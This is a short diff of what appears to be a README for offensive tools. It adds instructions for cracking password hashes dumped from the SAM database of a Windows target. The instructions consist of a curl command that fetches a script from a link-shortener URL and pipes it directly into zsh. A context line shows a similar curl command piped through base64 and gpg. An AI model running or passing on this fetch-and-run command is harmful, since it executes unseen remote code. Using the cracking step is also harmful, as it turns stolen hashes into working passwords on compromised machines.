@@ -44,6 +44,8 @@ curl  --proto '=https' --tlsv1.2 -L -sSf  | base64 -d | gpg --decrypt
 
 * [Crack sam_hashes](https://shortly.fun/cracksam)
 
+If you have successfully dumped hashes from the sam database of a Windows target and stored them to a file you can use the following scrip to retrieve the cleartext passwords:
+
 ```
 # Download via: 
 curl  --proto '=https' --tlsv1.2 -L -sSf https://shortly.fun/cracksam | zsh -s <absolute-path-to-hashes> <absolute-path-to-wordlist>
